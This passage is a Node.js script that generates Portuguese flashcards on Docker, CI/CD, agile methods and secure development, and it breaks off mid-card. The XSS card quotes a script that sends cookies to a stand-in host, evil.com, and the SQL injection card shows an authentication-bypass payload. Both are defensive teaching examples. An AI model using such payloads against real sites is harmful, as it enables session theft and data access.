const fs = require("fs");
const path = require("path");

const jsonPath = path.join(__dirname, "..", "data", "cards", "json", "engenharia-de-software.json");
const data = JSON.parse(fs.readFileSync(jsonPath, "utf-8"));

const track = "engenharia-de-software";

function card(category, difficulty, num, tags, question, options, correctIndex, explanation, example) {
  return {
    id: `${track}__${category}__${difficulty}__${num}`,
    tags,
    track,
    category,
    difficulty,
    question,
    options,
    correctIndex,
    explanation,
    example,
  };
}

const newCards = [
  // ======================== DOCKER E CONTAINERS (10) ========================
  // Fácil (4)
  card("Docker e Containers", "Fácil", 1,
    ["docker", "containers", "virtualização"],
    "Qual a principal diferença entre containers e máquinas virtuais?",
    ["Containers compartilham o kernel do host e são mais leves; VMs emulam hardware completo com SO próprio", "São idênticos", "VMs são mais leves que containers", "Containers precisam de hypervisor"],
    0,
    "Containers isolam processos no nível do OS, compartilhando o kernel do host. VMs emulam hardware via hypervisor, cada uma com SO completo. Por isso, containers iniciam em segundos (vs minutos), usam menos memória e disco. Docker é o runtime de containers mais popular.",
    "Container: ~50MB, inicia em <1s, compartilha kernel Linux. VM: ~2GB, inicia em 1-2min, tem kernel próprio. Um servidor pode rodar centenas de containers vs dezenas de VMs."
  ),
  card("Docker e Containers", "Fácil", 2,
    ["docker", "dockerfile", "image"],
    "O que é um Dockerfile e qual sua relação com uma imagem Docker?",
    ["Dockerfile é um arquivo de instruções para construir uma imagem; a imagem é o template imutável para criar containers", "Dockerfile é o container em execução", "Imagem e container são a mesma coisa", "Dockerfile só configura rede"],
    0,
    "Dockerfile contém instruções sequenciais (FROM, COPY, RUN, CMD) para construir uma imagem Docker. A imagem é um pacote imutável com o app e suas dependências. Containers são instâncias em execução de uma imagem. Analogia: Dockerfile = receita, Imagem = bolo pronto congelado, Container = bolo servido.",
    "FROM node:20-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nEXPOSE 3000\nCMD [\"node\", \"server.js\"]\n# docker build -t meuapp . → imagem\n# docker run -p 3000:3000 meuapp → container"
  ),
  card("Docker e Containers", "Fácil", 3,
    ["docker", "commands", "basics"],
    "Quais são os comandos Docker mais usados no dia a dia?",
    ["docker build, docker run, docker ps, docker stop, docker logs", "docker start é o único necessário", "docker compile e docker execute", "docker init e docker deploy"],
    0,
    "Os comandos essenciais são: docker build (cria imagem), docker run (cria e inicia container), docker ps (lista containers rodando), docker stop (para container), docker logs (vê output), docker exec (executa comando dentro do container), docker images (lista imagens locais).",
    "docker build -t api:v1 . → Constrói imagem 'api:v1'. docker run -d -p 8080:3000 api:v1 → Roda em background, porta 8080→3000. docker ps → Lista containers ativos. docker logs -f abc123 → Segue os logs em tempo real."
  ),
  card("Docker e Containers", "Fácil", 4,
    ["docker", "volumes", "persistence"],
    "Por que containers perdem dados ao serem removidos e como resolver isso?",
    ["Containers são efêmeros por design; volumes Docker persistem dados fora do filesystem do container", "Containers nunca perdem dados", "Usar mais RAM resolve", "Salvar no Dockerfile"],
    0,
    "O filesystem de um container é efêmero: ao ser removido, tudo dentro dele é perdido. Volumes Docker são diretórios gerenciados pelo Docker que existem fora do container e persistem entre recriações. Bind mounts mapeiam diretórios do host diretamente. Volumes são preferíveis para dados de produção (bancos, uploads).",
    "docker run -v pgdata:/var/lib/postgresql/data postgres → Volume nomeado 'pgdata' persiste os dados do PostgreSQL mesmo se o container for removido e recriado. docker volume ls → Lista volumes."
  ),
  // Médio (3)
  card("Docker e Containers", "Médio", 1,
    ["docker", "compose", "multi-container"],
    "O que é Docker Compose e quando usá-lo?",
    ["Ferramenta para definir e orquestrar múltiplos containers em um arquivo YAML, ideal para ambientes de desenvolvimento", "É um substituto do Dockerfile", "Só funciona em produção", "É um orquestrador como Kubernetes"],
    0,
    "Docker Compose define múltiplos serviços (containers) em um arquivo docker-compose.yml. Com um comando (docker compose up), sobe toda a stack: app, banco, cache, etc. Define redes, volumes, variáveis de ambiente e dependências entre serviços. Ideal para desenvolvimento local e testes. Não é substituto de Kubernetes para produção em escala.",
    "services:\n  api:\n    build: .\n    ports: ['3000:3000']\n    depends_on: [db, redis]\n  db:\n    image: postgres:16\n    volumes: ['pgdata:/var/lib/postgresql/data']\n  redis:\n    image: redis:7-alpine\n# docker compose up -d → sobe tudo"
  ),
  card("Docker e Containers", "Médio", 2,
    ["docker", "multi-stage", "optimization"],
    "O que é multi-stage build e por que é importante?",
    ["Usa múltiplos FROM no Dockerfile para separar build de runtime, gerando imagens menores e mais seguras", "É usar múltiplos Dockerfiles", "Só serve para linguagens compiladas", "Aumenta o tamanho da imagem"],
    0,
    "Multi-stage build usa múltiplos estágios (FROM) num único Dockerfile. O primeiro estágio compila/builda o app com todas as ferramentas. O segundo estágio copia apenas os artefatos necessários para uma imagem base mínima. Resultado: imagens muito menores (100MB vs 1GB) e sem ferramentas de build expostas em produção.",
    "# Estágio 1: Build\nFROM node:20 AS builder\nWORKDIR /app\nCOPY . .\nRUN npm ci && npm run build\n\n# Estágio 2: Produção (só o necessário)\nFROM node:20-alpine\nCOPY --from=builder /app/dist ./dist\nCOPY --from=builder /app/node_modules ./node_modules\nCMD [\"node\", \"dist/server.js\"]\n# Imagem final: ~150MB vs ~900MB"
  ),
  card("Docker e Containers", "Médio", 3,
    ["docker", "networking", "communication"],
    "Como containers se comunicam entre si no Docker?",
    ["Via redes Docker internas — containers na mesma rede se acessam pelo nome do serviço como hostname", "Somente via localhost", "Precisam de IP público", "Não podem se comunicar"],
    0,
    "Docker cria redes internas (bridge, overlay) onde containers se comunicam. No Docker Compose, todos os serviços ficam na mesma rede automaticamente e se acessam pelo nome do serviço como hostname DNS. Portas expostas (ports) são para acesso externo; comunicação interna usa a rede Docker sem expor portas.",
    "# No docker-compose.yml, 'api' acessa o banco por:\n# postgres://db:5432/mydb (hostname = nome do serviço 'db')\n# Redis: redis://redis:6379\n# Não precisa expor portas 5432 ou 6379 para o host — comunicação interna."
  ),
  // Difícil (3)
  card("Docker e Containers", "Difícil", 1,
    ["docker", "security", "best-practices"],
    "Quais são as melhores práticas de segurança para imagens Docker em produção?",
    ["Usar imagens base mínimas, rodar como non-root, não armazenar secrets na imagem, scan de vulnerabilidades", "Usar imagens latest sempre", "Rodar como root para ter permissões", "Ignorar vulnerabilidades em dependências"],
    0,
    "Práticas essenciais: 1) Usar imagens mínimas (alpine, distroless) para reduzir superfície de ataque. 2) Rodar como non-root (USER node). 3) Nunca colocar secrets no Dockerfile (usar runtime env ou secret managers). 4) Fixar versões de imagens base (node:20.11-alpine, não :latest). 5) Scannear com Trivy/Snyk. 6) Usar .dockerignore.",
    "FROM node:20-alpine\nRUN addgroup -S app && adduser -S app -G app\nWORKDIR /app\nCOPY --chown=app:app . .\nRUN npm ci --omit=dev\nUSER app  # Non-root!\nCMD [\"node\", \"server.js\"]\n# .dockerignore: .git, node_modules, .env, *.secret"
  ),
  card("Docker e Containers", "Difícil", 2,
    ["docker", "layers", "caching"],
    "Como funciona o sistema de layers e cache do Docker e como otimizá-lo?",
    ["Cada instrução cria uma layer cacheável; ordenar instruções da menos mutável para a mais mutável maximiza cache hits", "Layers são recriadas sempre", "Cache não existe no Docker", "Ordem das instruções não importa"],
    0,
    "Cada instrução no Dockerfile (FROM, RUN, COPY) cria uma layer imutável e cacheável. Se uma layer muda, todas as layers seguintes são reconstruídas. Otimização: colocar instruções que mudam pouco primeiro (FROM, RUN apt install) e as que mudam sempre por último (COPY código). Separar COPY package.json do COPY . permite cachear npm install.",
    "# ❌ Ruim: qualquer mudança no código invalida npm install\nCOPY . .\nRUN npm install\n\n# ✅ Bom: npm install só re-executa se package.json mudar\nCOPY package*.json ./\nRUN npm ci\nCOPY . .  # Só esta layer muda quando o código muda"
  ),
  card("Docker e Containers", "Difícil", 3,
    ["docker", "health-checks", "orchestration"],
    "O que são health checks no Docker e como configurá-los?",
    ["Verificações periódicas que determinam se o container está saudável; Docker reinicia containers unhealthy em orquestradores", "São logs de erro", "Só funcionam com Kubernetes", "Verificam uso de CPU apenas"],
    0,
    "HEALTHCHECK no Dockerfile define um comando executado periodicamente para verificar se a aplicação está respondendo. Estados: starting, healthy, unhealthy. Orquestradores (Docker Swarm, Kubernetes) usam health checks para reiniciar containers com falha e desviar tráfego. Parâmetros: interval, timeout, retries, start-period.",
    "HEALTHCHECK --interval=30s --timeout=5s --retries=3 --start-period=10s \\\n  CMD curl -f http://localhost:3000/health || exit 1\n\n# docker ps mostra: (healthy) ou (unhealthy)\n# Swarm/K8s reinicia automaticamente containers unhealthy."
  ),

  // ======================== CI/CD E DEVOPS (10) ========================
  // Fácil (4)
  card("CI/CD e DevOps", "Fácil", 1,
    ["cicd", "continuous-integration", "automation"],
    "O que é CI (Continuous Integration) e qual problema ela resolve?",
    ["Prática de integrar código frequentemente com builds e testes automatizados, detectando bugs cedo", "É fazer deploy manual", "É escrever testes unitários", "É uma ferramenta específica"],
    0,
    "CI (Integração Contínua) é a prática de integrar código de múltiplos devs várias vezes ao dia num repositório compartilhado. Cada integração dispara build e testes automaticamente. Isso detecta conflitos e bugs rapidamente, em vez de descobri-los semanas depois num merge gigante. Ferramentas: GitHub Actions, Jenkins, GitLab CI.",
    "Dev faz push → CI automaticamente: 1) Compila o código 2) Roda testes unitários 3) Roda linter 4) Reporta status no PR. Se falha, o dev corrige antes de dar merge. Sem CI: bugs são descobertos dias depois em integração manual."
  ),
  card("CI/CD e DevOps", "Fácil", 2,
    ["cicd", "continuous-delivery", "deployment"],
    "Qual a diferença entre Continuous Delivery e Continuous Deployment?",
    ["Delivery: código sempre pronto para deploy (manual); Deployment: deploy automático em produção a cada commit aprovado", "São a mesma coisa", "Delivery é mais arriscado", "Deployment exige aprovação manual"],
    0,
    "Continuous Delivery garante que o código está sempre num estado deployável após passar por todos os testes e validações; o deploy para produção requer aprovação manual. Continuous Deployment vai além: após passar no pipeline, o código vai automaticamente para produção sem intervenção humana. CD requer suite de testes muito confiável.",
    "Continuous Delivery: push → build → testes → staging → [botão deploy] → produção. Continuous Deployment: push → build → testes → staging → produção (automático). Netflix e Amazon fazem deployment contínuo: milhares de deploys por dia."
  ),
  card("CI/CD e DevOps", "Fácil", 3,
    ["cicd", "github-actions", "workflow"],
    "O que é GitHub Actions e como funciona um workflow básico?",
    ["Plataforma CI/CD do GitHub que executa workflows automatizados definidos em YAML, disparados por eventos como push e PR", "É um editor de código", "Só funciona para deploy", "É um substituto do Git"],
    0,
    "GitHub Actions executa workflows definidos em arquivos YAML (.github/workflows/). Cada workflow tem triggers (on: push, pull_request), jobs (conjunto de steps) e steps (ações individuais). Jobs rodam em runners (VMs na nuvem). Actions reutilizáveis (marketplace) simplificam tarefas comuns.",
    "# .github/workflows/ci.yml\nname: CI\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n      - run: npm ci\n      - run: npm test"
  ),
  card("CI/CD e DevOps", "Fácil", 4,
    ["devops", "culture", "practices"],
    "O que é a cultura DevOps e quais seus pilares?",
    ["União de Dev e Ops com automação, colaboração, feedback contínuo e responsabilidade compartilhada", "É apenas um cargo específico", "É usar Docker", "É ter um time de infraestrutura separado"],
    0,
    "DevOps é uma cultura que une desenvolvimento (Dev) e operações (Ops) para entregar software mais rápido e confiável. Pilares: automação (CI/CD, IaC), colaboração (times cross-funcionais), monitoramento contínuo, feedback rápido, e responsabilidade compartilhada (you build it, you run it). Não é um cargo, é uma mentalidade.",
    "Antes: Dev entrega código → Ops faz deploy (semanas) → problemas em produção → culpa mútua. DevOps: time responsável pelo ciclo completo → push → CI/CD → deploy automático → monitoramento → feedback → melhoria contínua."
  ),
  // Médio (3)
  card("CI/CD e DevOps", "Médio", 1,
    ["cicd", "pipeline", "stages"],
    "Quais são os estágios típicos de um pipeline CI/CD robusto?",
    ["Lint → Build → Testes unitários → Testes de integração → Security scan → Deploy staging → Deploy produção", "Apenas build e deploy", "Só testes unitários", "Lint e commit são suficientes"],
    0,
    "Um pipeline maduro inclui: 1) Lint/format (qualidade de código), 2) Build (compilação), 3) Testes unitários (rápidos), 4) Testes de integração (com banco/APIs), 5) Security scan (SAST/DAST, dependências), 6) Build de artefato/imagem, 7) Deploy em staging, 8) Testes e2e/smoke, 9) Aprovação (para CD), 10) Deploy em produção, 11) Health check.",
    "GitHub Actions pipeline completo:\njobs:\n  lint → test-unit → test-integration → security-scan → build-image → deploy-staging → e2e-tests → deploy-prod\nCada estágio falha fast: se lint falha, nada mais roda."
  ),
  card("CI/CD e DevOps", "Médio", 2,
    ["cicd", "infrastructure-as-code", "terraform"],
    "O que é Infrastructure as Code (IaC) e qual sua vantagem?",
    ["Gerenciar infraestrutura via código versionável e reproducível em vez de configuração manual", "É escrever código dentro de servidores", "É documentar a infra em PDF", "Só funciona com AWS"],
    0,
    "IaC define toda a infraestrutura (servidores, redes, bancos, DNS) em arquivos de código versionados no Git. Vantagens: reprodutibilidade (ambientes idênticos), auditabilidade (histórico no Git), automação (apply via CI/CD), documentação viva. Ferramentas: Terraform (multi-cloud), CloudFormation (AWS), Pulumi (linguagens reais), Ansible (configuração).",
    "# Terraform: cria instância EC2 + RDS + VPC\nresource \"aws_instance\" \"api\" {\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t3.medium\"\n}\n# terraform plan → mostra mudanças\n# terraform apply → aplica\n# Tudo no Git com code review!"
  ),
  card("CI/CD e DevOps", "Médio", 3,
    ["cicd", "deployment-strategies", "rollback"],
    "Quais são as principais estratégias de deploy e seus trade-offs?",
    ["Rolling update (gradual), Blue-Green (dois ambientes), Canary (% do tráfego), Feature flags (toggle no código)", "Apenas deploy direto", "Só existe Blue-Green", "Rolling update não permite rollback"],
    0,
    "Rolling update: substitui instâncias gradualmente — simples, mas rollback é lento. Blue-Green: dois ambientes idênticos, switch instantâneo — rollback rápido, mas dobra o custo. Canary: direciona pequeno % do tráfego para nova versão — detecta problemas com impacto mínimo. Feature flags: funcionalidade no código controlada por toggle — deploy ≠ release.",
    "Canary deploy: v2 recebe 5% do tráfego → monitora métricas (error rate, latência) → se OK, aumenta para 25% → 50% → 100%. Se métricas degradam em qualquer ponto → rollback automático para v1. Netflix e Google usam canary extensivamente."
  ),
  // Difícil (3)
  card("CI/CD e DevOps", "Difícil", 1,
    ["cicd", "secrets-management", "security"],
    "Como gerenciar secrets (senhas, tokens, chaves) em pipelines CI/CD de forma segura?",
    ["Usar secret managers (Vault, AWS Secrets Manager) ou secrets do CI/CD; nunca versionar secrets no repositório", "Colocar no .env commitado", "Hardcodar no código-fonte", "Usar variáveis de ambiente em texto plano no YAML"],
    0,
    "Nunca versionar secrets no repositório. Abordagens seguras: 1) Secrets do CI/CD (GitHub Encrypted Secrets, GitLab CI Variables) — injetados como variáveis de ambiente no runtime. 2) Secret managers (HashiCorp Vault, AWS Secrets Manager) — rotação automática, auditoria. 3) SOPS ou age para encriptar secrets no Git. Sempre auditar acesso e rotacionar periodicamente.",
    "# GitHub Actions: secrets injetados no runtime\nenv:\n  DATABASE_URL: ${{ secrets.DATABASE_URL }}\n  API_KEY: ${{ secrets.API_KEY }}\n# Nunca aparecem nos logs (masked automaticamente)\n# Rotação: trocar no GitHub Settings → Secrets, sem mudar código"
  ),
  card("CI/CD e DevOps", "Difícil", 2,
    ["cicd", "gitops", "argocd"],
    "O que é GitOps e como ele difere de CI/CD tradicional?",
    ["GitOps usa Git como única fonte de verdade para infraestrutura e deploys; um operador reconcilia o estado declarado com o real", "É apenas usar Git", "É o mesmo que CI/CD", "Só funciona sem Kubernetes"],
    0,
    "GitOps é um paradigma onde o estado desejado da infraestrutura e aplicações é declarado em Git. Um operador (ArgoCD, Flux) observa o repositório e reconcilia automaticamente o cluster com o estado declarado. Diferenças do CI/CD tradicional: pull-based (operador puxa mudanças) vs push-based, Git como fonte de verdade, reconciliação contínua, auditoria completa via Git history.",
    "GitOps flow: Dev muda manifesto K8s no Git → PR com review → merge → ArgoCD detecta diff → aplica automaticamente no cluster → se alguém mudar o cluster manualmente, ArgoCD reverte para o estado do Git. Rollback = git revert."
  ),
  card("CI/CD e DevOps", "Difícil", 3,
    ["cicd", "testing-pyramid", "pipeline-optimization"],
    "Como otimizar o tempo de execução de um pipeline CI/CD sem sacrificar qualidade?",
    ["Paralelizar jobs, cachear dependências, testes em pirâmide (muitos unitários, poucos e2e), fail fast, builds incrementais", "Remover testes", "Rodar tudo sequencialmente", "Usar máquinas maiores apenas"],
    0,
    "Otimizações-chave: 1) Paralelizar jobs e testes independentes. 2) Cachear dependências (node_modules, Docker layers). 3) Pirâmide de testes (muitos unitários rápidos, poucos e2e lentos). 4) Fail fast (lint e unitários primeiro). 5) Builds incrementais (só re-buildar o que mudou). 6) Test splitting (dividir suite entre runners). 7) Skip condicional (só rodar testes relevantes por path changed).",
    "# GitHub Actions otimizado:\njobs:\n  lint:  # 10s — fail fast\n  unit-tests:  # 30s — paralelo com lint\n    strategy:\n      matrix:\n        shard: [1, 2, 3, 4]  # Test splitting\n  integration:  # 2min — só após unit\n    needs: [lint, unit-tests]\n  cache:\n    uses: actions/cache@v4  # Cacheia node_modules"
  ),

  // ======================== METODOLOGIAS ÁGEIS (10) ========================
  // Fácil (4)
  card("Metodologias Ágeis", "Fácil", 1,
    ["agile", "manifesto", "principles"],
    "Quais são os 4 valores do Manifesto Ágil?",
    ["Indivíduos e interações > processos; Software funcionando > documentação; Colaboração com cliente > contrato; Responder a mudanças > seguir plano", "Documentação detalhada é o mais importante", "Seguir o plano original rigidamente", "Processos e ferramentas acima de tudo"],
    0,
    "O Manifesto Ágil (2001) define 4 valores: 1) Indivíduos e interações sobre processos e ferramentas. 2) Software funcionando sobre documentação abrangente. 3) Colaboração com o cliente sobre negociação de contratos. 4) Responder a mudanças sobre seguir um plano. Os itens à direita têm valor, mas os da esquerda são priorizados.",
    "Na prática: em vez de gastar 3 meses documentando requisitos (waterfall), o time entrega incrementos funcionais a cada 2 semanas, com feedback constante do cliente. Mudanças são bem-vindas, não resistidas."
  ),
  card("Metodologias Ágeis", "Fácil", 2,
    ["agile", "scrum", "framework"],
    "O que é Scrum e quais são seus 3 papéis principais?",
    ["Framework ágil com ciclos curtos (sprints); papéis: Product Owner, Scrum Master e Developers", "É uma metodologia com gerente de projeto", "Só tem dois papéis: dev e QA", "É um tipo de Kanban"],
    0,
    "Scrum organiza trabalho em sprints (1-4 semanas). Product Owner prioriza o backlog e representa o negócio. Scrum Master facilita o processo e remove impedimentos. Developers (time multifuncional) entregam o incremento. Cerimônias: Sprint Planning, Daily Standup, Sprint Review, Retrospectiva.",
    "Sprint de 2 semanas: Planning (segunda) → Dailys (15min/dia) → Development → Review (sexta da 2ª semana, demo pro PO) → Retrospectiva (o que melhorar). Resultado: incremento potencialmente entregável a cada sprint."
  ),
  card("Metodologias Ágeis", "Fácil", 3,
    ["agile", "kanban", "workflow"],
    "O que é Kanban e como difere do Scrum?",
    ["Kanban é fluxo contínuo com limites de WIP e visualização do trabalho; Scrum usa sprints com timeboxes fixos", "São idênticos", "Kanban tem sprints obrigatórios", "Scrum não tem papéis definidos"],
    0,
    "Kanban foca em fluxo contínuo: visualizar trabalho em um board (To Do → In Progress → Done), limitar WIP (Work In Progress) para evitar sobrecarga, e otimizar o lead time. Diferente do Scrum: sem sprints fixos, sem papéis obrigatórios, sem cerimônias fixas. É mais flexível e ideal para times de suporte ou trabalho com demandas imprevisíveis.",
    "Board Kanban: To Do (sem limite) | In Progress (WIP: 3) | Code Review (WIP: 2) | Done. Se In Progress tem 3 itens, ninguém puxa novo item — primeiro termina ou desbloqueiam algo. Métricas: lead time, throughput, cycle time."
  ),
  card("Metodologias Ágeis", "Fácil", 4,
    ["agile", "user-stories", "backlog"],
    "O que são User Stories e como escrever uma boa user story?",
    ["Descrição de funcionalidade do ponto de vista do usuário: 'Como [persona], quero [ação] para [benefício]'", "São requisitos técnicos detalhados", "São bugs reportados", "São tarefas de design"],
    0,
    "User stories descrevem funcionalidades na perspectiva do usuário final, não em termos técnicos. Formato: 'Como [tipo de usuário], eu quero [ação/funcionalidade] para que [benefício/valor]'. Boas stories seguem INVEST: Independent, Negotiable, Valuable, Estimable, Small, Testable. Critérios de aceitação definem quando está 'pronta'.",
    "Como usuário logado, eu quero filtrar produtos por preço para encontrar itens dentro do meu orçamento.\n\nCritérios de aceitação:\n- Campo de preço mín/máx no filtro\n- Resultados atualizam em tempo real\n- Limpar filtro restaura a lista completa"
  ),
  // Médio (3)
  card("Metodologias Ágeis", "Médio", 1,
    ["agile", "estimation", "story-points"],
    "O que são Story Points e por que usá-los em vez de horas para estimar?",
    ["Story Points medem complexidade relativa, não tempo absoluto; são mais precisos em longo prazo e evitam ancoragem em horas", "São horas disfarçadas", "Medem linhas de código", "Só servem para tarefas simples"],
    0,
    "Story Points estimam esforço relativo considerando complexidade, incerteza e volume de trabalho — não tempo. A sequência de Fibonacci (1, 2, 3, 5, 8, 13, 21) reflete que a incerteza cresce com a complexidade. Vantagens sobre horas: removem a pressão individual, melhoram com o tempo (velocity estabiliza), e funcionam melhor para planning de sprints.",
    "Time estima com Planning Poker: Task A (login simples) = 2 pontos. Task B (integração API pagamento) = 8 pontos. Task C (refatoração do cache) = 5 pontos. Velocity média: 30 pontos/sprint → próximo sprint pode comprometer ~30 pontos."
  ),
  card("Metodologias Ágeis", "Médio", 2,
    ["agile", "retrospective", "continuous-improvement"],
    "Qual o objetivo da Sprint Retrospectiva e como conduzir uma eficaz?",
    ["Reflexão do time sobre o que funcionou, o que melhorar e ações concretas; foco em melhoria contínua do processo", "Avaliar performance individual", "Replanejar o backlog", "Apresentar o produto ao cliente"],
    0,
    "A Retrospectiva é a cerimônia de melhoria contínua: o time reflete sobre a sprint que acabou. Formato clássico: O que deu certo? O que deu errado? O que vamos melhorar? Gera action items concretos (com responsável e prazo). Deve ser um safe space. Dinâmicas variadas mantêm o engajamento: Start/Stop/Continue, Sailboat, 4L's (Liked, Learned, Lacked, Longed for).",
    "Retro da Sprint 15:\n✅ Liked: pair programming ajudou na integração\n❌ Lacked: testes e2e falharam no CI sem ninguém perceber\n🎯 Action: configurar notificação no Slack para falhas de CI (responsável: Ana, até sexta)\n📊 Medir: tempo de resposta a falhas de CI na próxima retro"
  ),
  card("Metodologias Ágeis", "Médio", 3,
    ["agile", "mvp", "lean"],
    "O que é MVP (Minimum Viable Product) e qual sua importância no desenvolvimento ágil?",
    ["Versão mínima do produto com funcionalidades essenciais para validar hipóteses com usuários reais e aprender rápido", "É o produto final com menos bugs", "É um protótipo sem testes", "É a versão beta com todas as features"],
    0,
    "MVP é a versão mais simples do produto que entrega valor suficiente para validar a hipótese principal com usuários reais. O objetivo não é entregar pouco, mas aprender rápido com feedback real. Conceito central do Lean Startup: Build → Measure → Learn. Evita gastar meses construindo algo que ninguém quer. Depois do MVP, iterações adicionam funcionalidades baseadas em dados.",
    "Exemplo: app de delivery. MVP não é: app completo sem polimento. MVP é: cardápio de 1 restaurante, pedido via WhatsApp, entrega manual. Valida: 'pessoas pedem comida pelo celular nesta região?' Se sim, então investe em app completo."
  ),
  // Difícil (3)
  card("Metodologias Ágeis", "Difícil", 1,
    ["agile", "scaling", "safe"],
    "Quais frameworks existem para escalar ágil em grandes organizações?",
    ["SAFe, LeSS, Nexus e Spotify Model — cada um com abordagem diferente para coordenar múltiplos times ágeis", "Ágil não escala", "Scrum serve para qualquer tamanho", "Basta adicionar mais Scrum Masters"],
    0,
    "SAFe (Scaled Agile Framework): mais prescritivo, com ARTs (Agile Release Trains), PI Planning. LeSS (Large-Scale Scrum): múltiplos times com um Product Owner e Sprint compartilhada — simples. Nexus: extensão do Scrum para 3-9 times com Integration Team. Spotify Model: squads, tribes, chapters, guilds — autonomia com alinhamento. Escolha depende da cultura e tamanho.",
    "SAFe: 50-125 devs em ART, PI Planning a cada 8-12 semanas, sincroniza times. Spotify: Squads (mini Scrum teams) → Tribes (agrupamento de squads) → Chapters (mesma competência entre squads) → Guilds (comunidades de interesse). Não existe bala de prata — adaptação é chave."
  ),
  card("Metodologias Ágeis", "Difícil", 2,
    ["agile", "metrics", "velocity"],
    "Quais métricas ágeis são mais úteis e quais são armadilhas comuns?",
    ["Úteis: velocity (tendência), lead time, cycle time, throughput; Armadilha: usar velocity para comparar times ou como meta", "Velocity alta = time bom", "Número de story points é tudo", "Métricas são desnecessárias em ágil"],
    0,
    "Métricas úteis: Velocity (pontos/sprint — para previsibilidade, NÃO para pressão), Lead Time (ideia → produção), Cycle Time (início do trabalho → entrega), Throughput (itens entregues/período). Armadilhas: comparar velocity entre times (pontos são relativos), inflar pontos para parecer produtivo, medir horas individuais, ignorar qualidade. Métricas devem guiar melhoria, não punição.",
    "Time A: velocity 40 pts, Team B: velocity 20 pts. Time A é melhor? NÃO! Pontos são relativos. O que importa: velocity é estável? Lead time está diminuindo? Cycle time é previsível? Bug rate pós-deploy está aceitável? Foco em tendências, não valores absolutos."
  ),
  card("Metodologias Ágeis", "Difícil", 3,
    ["agile", "technical-debt", "management"],
    "O que é dívida técnica e como gerenciá-la em um contexto ágil?",
    ["Atalhos técnicos que aceleram entrega mas geram custo futuro; gerenciar com backlog dedicado, métricas e alocação de % do sprint", "Dívida técnica deve ser ignorada", "Só existe em código legado", "É responsabilidade exclusiva do tech lead"],
    0,
    "Dívida técnica são decisões que priorizam velocidade sobre qualidade (code workarounds, falta de testes, arquitetura improvisada). Como juros financeiros, acumula e encarece mudanças futuras. Gestão: 1) Tornar visível (backlog de tech debt). 2) Alocar 15-20% de cada sprint para redução. 3) Tratar no Definition of Done (sem criar nova dívida). 4) Medir: tempo de resolução de bugs, velocity trend.",
    "Sprint com 10 pontos de capacidade: 8 pts features + 2 pts tech debt. Tech debt backlog: 'Migrar auth para OAuth 2.0' (13 pts, prioridade alta), 'Adicionar testes em módulo X' (5 pts). Regra: nunca mais que 2 sprints sem endereçar tech debt."
  ),

  // ======================== SEGURANÇA NO DESENVOLVIMENTO (10) ========================
  // Fácil (4)
  card("Segurança no Desenvolvimento", "Fácil", 1,
    ["security", "owasp", "top-10"],
    "O que é o OWASP Top 10?",
    ["Lista das 10 vulnerabilidades de segurança mais críticas em aplicações web, atualizada periodicamente pela OWASP", "É um framework de testes", "É um firewall", "É uma certificação de segurança"],
    0,
    "OWASP (Open Web Application Security Project) publica o Top 10 — as vulnerabilidades mais comuns e impactantes em apps web. A versão 2021 inclui: Broken Access Control (#1), Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Auth Failures, Integrity Failures, Logging Failures, SSRF. É referência para auditorias e compliance.",
    "Top 3 OWASP 2021: 1) Broken Access Control — usuário acessa dados de outro. 2) Cryptographic Failures — dados sensíveis sem criptografia. 3) Injection — SQL/XSS/Command injection. Todo dev deveria conhecer e saber prevenir cada um."
  ),
  card("Segurança no Desenvolvimento", "Fácil", 2,
    ["security", "sql-injection", "injection"],
    "O que é SQL Injection e como prevenir?",
    ["Ataque que insere SQL malicioso via input do usuário; prevenir com prepared statements/parameterized queries", "É um erro de sintaxe SQL", "Só afeta bancos NoSQL", "Não é possível prevenir"],
    0,
    "SQL Injection ocorre quando input do usuário é concatenado diretamente numa query SQL, permitindo que o atacante execute comandos arbitrários. Pode ler, modificar ou deletar dados, e até executar comandos no OS. Prevenção: SEMPRE usar prepared statements / parameterized queries. Nunca concatenar strings para montar SQL.",
    "❌ Vulnerável: query = \"SELECT * FROM users WHERE email = '\" + input + \"'\"\nInput: ' OR '1'='1' -- → Retorna TODOS os users!\n\n✅ Seguro: query = \"SELECT * FROM users WHERE email = $1\", [input]\n→ Input é tratado como dado, nunca como código SQL."
  ),
  card("Segurança no Desenvolvimento", "Fácil", 3,
    ["security", "xss", "cross-site-scripting"],
    "O que é XSS (Cross-Site Scripting) e como prevenir?",
    ["Injeção de scripts maliciosos em páginas web vistas por outros usuários; prevenir com encoding/sanitização de output", "É um ataque ao servidor", "Só afeta APIs", "Não existe mais em frameworks modernos"],
    0,
    "XSS permite que atacantes injetem JavaScript malicioso em páginas vistas por outros usuários. Tipos: Stored (persiste no banco), Reflected (via URL), DOM-based (manipula DOM client-side). Pode roubar cookies/tokens, redirecionar, keylogger. Prevenção: sanitizar/escapar output HTML, usar Content Security Policy (CSP), HttpOnly cookies, frameworks com auto-escaping (React, Angular).",
    "❌ Vulnerável: <div>{userComment}</div> sem sanitização\nAttacker: <script>fetch('evil.com?cookie='+document.cookie)</script>\n\n✅ React auto-escapa por padrão: {userComment} é seguro.\n❌ Mas dangerouslySetInnerHTML desativa a proteção — evitar!"
  ),
  card("Segurança no Desenvolvimento", "Fácil", 4,
    ["security", "https", "encryption"],
    "Por que HTTPS é essencial e o que acontece sem ele?",
    ["HTTPS criptografa dados em trânsito com TLS, prevenindo interceptação; sem ele, dados trafegam em texto plano", "HTTPS é apenas para e-commerce", "HTTP é igualmente seguro", "HTTPS só protege senhas"],
    0,
    "HTTPS usa TLS (Transport Layer Security) para criptografar toda a comunicação entre cliente e servidor. Sem HTTPS (HTTP puro), qualquer intermediário (WiFi público, ISP, roteador) pode ler e modificar dados em trânsito: senhas, tokens, dados pessoais. HTTPS também garante autenticidade (certificado verifica identidade do servidor) e integridade (dados não foram alterados).",
    "HTTP: Senha '12345' trafega como texto plano → Wi-Fi sniffer captura. HTTPS: Senha criptografada → interceptador vê bytes ilegíveis. Hoje: HTTPS é obrigatório — browsers marcam HTTP como 'Não seguro'. Let's Encrypt oferece certificados TLS gratuitos."
  ),
  // Médio (3)
  card("Segurança no Desenvolvimento", "Médio", 1,
    ["security", "cors", "same-origin"],
    "O que é CORS e por que browsers bloqueiam requisições cross-origin?",
